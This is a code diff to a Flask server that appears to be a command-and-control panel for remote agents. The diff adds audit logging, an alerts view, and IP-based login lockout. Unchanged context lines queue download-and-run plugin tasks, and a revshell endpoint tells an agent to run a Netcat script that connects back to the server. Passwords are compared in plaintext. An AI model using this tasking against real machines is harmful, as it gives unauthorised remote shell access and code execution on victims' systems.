@@ -189,6 +189,7 @@ def beacon():
 # --- Live agents API ---
 AGENT_ONLINE_TIMEOUT = 30  # seconds
 
+# List all agent data
 @app.route("/agents-data")
 @require_token(role="admin")
 def agents_data():
@@ -322,8 +323,16 @@ def agent_create():
         lines[28] = f'AGENT_ID = "{id_number}"\n'
 
         f_out.writelines(lines)
-    #return jsonify({f"AGENT{id_number}": "created"}) ,200
-    return {"success": "created"} ,200
+
+    log_uuid = str(uuid.uuid4())
+    current_time = datetime.now(timezone.utc)
+
+    db = get_db()
+    db.execute(
+        "INSERT INTO logs (log_id, timestamp, role, log_message, alert_level) VALUES (?, ?, ?, ?, ?)",
+        (log_uuid, current_time, "administrator",f"Created a new agent {id_number}", "Info"))
+    db.commit()
+    return ({"status":"created"}) ,200
 
 # --- Agent result endpoint ---
 @app.route('/result', methods=['POST'])
@@ -374,7 +383,15 @@ def add_task():
         thread = threading.Thread(
         target=recurring_scheduler, args=(task_uuid, recurring_every, agent_id, command),daemon=True)
         thread.start()
-    print("waiting for task")
+
+    log_uuid = str(uuid.uuid4())
+    current_time = datetime.now(timezone.utc)
+    db = get_db()
+    db.execute(
+        "INSERT INTO logs (log_id, timestamp, role, log_message, alert_level) VALUES (?, ?, ?, ?, ?)",
+        (log_uuid, current_time, "administrator",f"Created a new task, Task_UUID: {task_uuid}", "Info"))
+    db.commit()
+
     return jsonify({"status": "accepted", "uuid": task_uuid})
 
 
@@ -551,114 +568,190 @@ def run_plugin():
     """, (task_uuid, agent_id, json.dumps({"type": "download", "url": plugin_url}),current_time))
     db.commit()
 
+    log_uuid = str(uuid.uuid4())
+    current_time = datetime.now(timezone.utc)
+    db = get_db()
+    db.execute(
+        "INSERT INTO logs (log_id, timestamp, role, log_message, alert_level) VALUES (?, ?, ?, ?, ?)",
+        (log_uuid, current_time, "administrator",f"Executed plugin : {plugin_name} Task_UUID: {task_uuid}", "Info"))
+    db.commit()
+
     return redirect(url_for('plugins_list'))
 
+def get_client_ip():
+    return request.remote_addr
+
+
+def update_attempts(db, ip, success):
+    record = db.execute(
+        "SELECT attempts FROM login_attempts WHERE ip = ?",
+        (ip,)
+    ).fetchone()
+
+    if success:
+        db.execute("DELETE FROM login_attempts WHERE ip = ?", (ip,))
+        return
+
+    if record:
+        db.execute("""
+            UPDATE login_attempts
+            SET attempts = attempts + 1,
+                last_attempt = ?
+            WHERE ip = ?
+        """, (datetime.now().isoformat(), ip))
+    else:
+        db.execute("""
+            INSERT INTO login_attempts (ip, attempts, last_attempt)
+            VALUES (?, 1, ?)
+        """, (ip, datetime.now().isoformat()))
+
+MAX_ATTEMPTS = 3
 # --- Login / Logout ---
 @app.route("/login", methods=["GET", "POST"])
 def login():
     db = get_db()
-    db.execute("DELETE FROM tokens WHERE expiry < ?", (datetime.now(timezone.utc).isoformat(),))
+    ip = get_client_ip()
+
+    # Clean expired tokens
+    db.execute(
+        "DELETE FROM tokens WHERE expiry < ?",
+        (datetime.now(timezone.utc).isoformat(),)
+    )
     db.commit()
 
-    # -------------------------
-    # HANDLE POST (BOTH JSON + FORM)
-    # -------------------------
-    if request.method == "POST":
+    # Check attempt limit
+    record = db.execute(
+        "SELECT attempts, last_attempt FROM login_attempts WHERE ip = ?",
+        (ip,)
+    ).fetchone()
 
-        # Detect input type
-        if request.is_json:
-            data = request.get_json(silent=True) or {}
-            username = data.get("username")
-            password = data.get("password")
-            agent_id = data.get("agent_id")
-            is_api = True
-        else:
-            username = request.form.get("username")
-            password = request.form.get("password")
-            agent_id = None
-            is_api = False
+    LOCK_TIME = timedelta(minutes=1)
 
-        # -------------------------
-        # Validate user
-        # -------------------------
-        row = db.execute(
-            "SELECT password, role FROM users WHERE username = ?",
-            (username,)
-        ).fetchone()
+    if record:
+        last = datetime.fromisoformat(record["last_attempt"])
+        if datetime.now() - last > LOCK_TIME:
+            db.execute("DELETE FROM login_attempts WHERE ip = ?", (ip,))
+            db.commit()
 
-        if not row or row["password"] != password:
-            if is_api:
-                return jsonify({"error": "Unauthorized"}), 401
-            return render_template("login.html", error="Invalid credentials")
-
-        role = row["role"]
-
-        # -------------------------
-        # ADMIN (Dashboard Login)
-        # -------------------------
-        if not is_api:
-            if role != "admin":
-                return render_template("login.html", error="Access denied")
-
-            session["username"] = username
-            session["role"] = role
-
-            return redirect(url_for("dashboard"))
-
-        # -------------------------
-        # API LOGIN (Agent or Admin API)
-        # -------------------------
-
-        token = secrets.token_hex(32)
-        expiry = datetime.utcnow() + timedelta(days=7)
-
-        # If agent_id provided → treat as agent
-        if agent_id:
-            db.execute("DELETE FROM tokens WHERE agent_id = ?", (agent_id,))
-            agent = db.execute(
-                "SELECT id FROM agents WHERE id = ?",
-                (agent_id,)
-            ).fetchone()
-
-            if not agent:
-                db.execute(
-                    """INSERT INTO agents (id, hostname, user, os, ip, last_seen)
-                       VALUES (?, ?, ?, ?, ?, ?)""",
-                    (
-                        agent_id,
-                        data.get("hostname"),
-                        data.get("user"),
-                        data.get("os"),
-                        request.remote_addr,
-                        datetime.utcnow().isoformat()
-                    )
-                )
-            else:
-                db.execute(
-                    "UPDATE agents SET last_seen = ?, ip = ? WHERE id = ?",
-                    (datetime.utcnow().isoformat(), request.remote_addr, agent_id)
-                )
-
-        # Store token with role awareness
+    if record and record["attempts"] >= MAX_ATTEMPTS:
+        log_uuid = str(uuid.uuid4())
+        current_time = datetime.now(timezone.utc)
+        db = get_db()
         db.execute(
-            "INSERT INTO tokens (token, agent_id, expiry, username) VALUES (?, ?, ?, ?)",
-            (token, agent_id, expiry.isoformat(), username)
-        )
+            "INSERT INTO logs (log_id, timestamp, role, log_message, alert_level) VALUES (?, ?, ?, ?, ?)",
+            (log_uuid, current_time, "None", f"Failed Login 3 Times, IP: {ip}", "Critical"))
+        db.commit()
+        return "Too many attempts from this IP"
 
+    # -------------------------
+    # GET request
+    # -------------------------
+    if request.method == "GET":
+        return render_template("login.html")
 
+    # -------------------------
+    # POST request
+    # -------------------------
+    if request.is_json:
+        data = request.get_json(silent=True) or {}
+        username = data.get("username")
+        password = data.get("password")
+        agent_id = data.get("agent_id")
+        is_api = True
+    else:
+        username = request.form.get("username")
+        password = request.form.get("password")
+        agent_id = None
+        is_api = False
+
+    # -------------------------
+    # Validate credentials
+    # -------------------------
+    row = db.execute(
+        "SELECT password, role FROM users WHERE username = ?",
+        (username,)
+    ).fetchone()
+
+    if not row or row["password"] != password:
+        update_attempts(db, ip, success=False)
         db.commit()
 
-        return jsonify({
-            "status": "ok",
-            "token": token,
-            "role": role,
-            "expires": expiry.isoformat()
-        }), 200
+        if is_api:
+            return jsonify({"error": "Unauthorized"}), 401
+        return render_template("login.html", error="Invalid credentials")
+
+    role = row["role"]
 
     # -------------------------
-    # GET → login page
+    # ADMIN WEB LOGIN
     # -------------------------
-    return render_template("login.html")
+    if not is_api:
+        if role != "admin":
+            update_attempts(db, ip, success=False)
+            db.commit()
+            return render_template("login.html", error="Access denied")
+
+        session["username"] = username
+        session["role"] = role
+
+        update_attempts(db, ip, success=True)
+        db.commit()
+
+        return redirect(url_for("dashboard"))
+
+    # -------------------------
+    # API LOGIN
+    # -------------------------
+    token = secrets.token_hex(32)
+    expiry = datetime.utcnow() + timedelta(days=7)
+
+    if agent_id:
+        db.execute("DELETE FROM tokens WHERE agent_id = ?", (agent_id,))
+
+        agent = db.execute(
+            "SELECT id FROM agents WHERE id = ?",
+            (agent_id,)
+        ).fetchone()
+
+        if not agent:
+            db.execute("""
+                INSERT INTO agents (id, hostname, user, os, ip, last_seen)
+                VALUES (?, ?, ?, ?, ?, ?)
+            """, (
+                agent_id,
+                data.get("hostname"),
+                data.get("user"),
+                data.get("os"),
+                request.remote_addr,
+                datetime.utcnow().isoformat()
+            ))
+        else:
+            db.execute("""
+                UPDATE agents
+                SET last_seen = ?, ip = ?
+                WHERE id = ?
+            """, (
+                datetime.utcnow().isoformat(),
+                request.remote_addr,
+                agent_id
+            ))
+
+    db.execute("""
+        INSERT INTO tokens (token, agent_id, expiry, username)
+        VALUES (?, ?, ?, ?)
+    """, (token, agent_id, expiry.isoformat(), username))
+
+    # ✅ success → reset attempts
+    update_attempts(db, ip, success=True)
+
+    db.commit()
+
+    return jsonify({
+        "status": "ok",
+        "token": token,
+        "role": role,
+        "expires": expiry.isoformat()
+    }), 200
 
 @app.route("/logout")
 def logout():
@@ -864,7 +957,35 @@ def dashboard():
         agents=agent_rows,
         tasks=tasks_str
     )
-# --- Tasks endpoints ---
+
+@app.route("/get_alerts")
+@require_token(role="admin")
+def get_alerts():
+    db = get_db()
+    rows = db.execute("""
+        SELECT log_id, timestamp, role, log_message, alert_level
+        FROM logs
+        ORDER BY timestamp DESC
+    """).fetchall()
+
+    tasks_dict = {
+        str(t["log_id"]): {
+            "log_id": t["log_id"],
+            "timestamp": t["timestamp"],
+            "role": t["role"],
+            "log_message": t["log_message"],
+            "alert_level": t["alert_level"],
+        }
+        for t in rows
+    }
+
+    return jsonify(tasks_dict)
+
+@app.route("/alerts")
+@require_token(role="admin")
+def alerts():
+    return render_template("alerts.html")
+
 @app.route("/tasks-data")
 @require_token(role="admin")
 def tasks_data():
@@ -957,8 +1078,6 @@ def revshell():
     port = request.json.get("port")
     task_uuid = str(uuid.uuid4())
     current_time = datetime.now(timezone.utc)
-    print(agent_id)
-    print(port)
     if port and agent_id:
         db = get_db()
         db.execute("""
@@ -985,6 +1104,15 @@ def revshell():
         VALUES (?, ?, ?, NULL, ?, NULL)
     """, (task_uuid, agent_id, json.dumps({"type": "shell", "command": f"python3 Netcat.py -t {IP} -p {port}"}),current_time))
     db.commit()
+
+    log_uuid = str(uuid.uuid4())
+    current_time = datetime.now(timezone.utc)
+    db = get_db()
+    db.execute(
+        "INSERT INTO logs (log_id, timestamp, role, log_message, alert_level) VALUES (?, ?, ?, ?, ?)",
+        (log_uuid, current_time, "administrator", f"Created a new Reverse shell, Task_UUID: {task_uuid}", "Info"))
+    db.commit()
+
     return jsonify({"status": "executed"})
 # --- Main ---
 if __name__ == "__main__":
